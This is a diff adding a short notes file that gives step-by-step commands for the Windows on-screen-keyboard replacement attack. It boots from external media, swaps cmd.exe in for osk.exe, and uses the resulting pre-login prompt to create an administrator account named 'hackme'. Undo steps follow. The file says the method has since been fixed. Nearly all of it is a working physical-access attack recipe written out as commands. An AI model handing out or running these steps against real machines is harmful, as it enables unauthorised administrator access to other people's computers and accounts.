@@ -1,0 +1,22 @@
+# windows method that replaced sticky keys or the on screen keyboard with the command prompt, so you could execute it before login
+# this prompt would have admin access, and you could add new users, change passwords etc.
+# this is fixed now, but there is a new method available.
+
+# this was the original method:
+burn hirens boot cd (a linux distro might work too) to usb
+boot with device usb
+(go to right drive, e.g. F:)
+cd \Windows\System32
+copy osk.exe osk.exe.bak
+copy cmd.exe osk.exe
+: reboot, go to on screen keyboard
+net user /add hackme password
+net localgroup administrators hackme /add
+
+# to undo this:
+net users hackme /delete
+del \Users\hackme
+boot to hirens usb
+(go to right drive, e.g. F:)
+cd \Windows\System32
+copy osk.exe.bak osk.exe
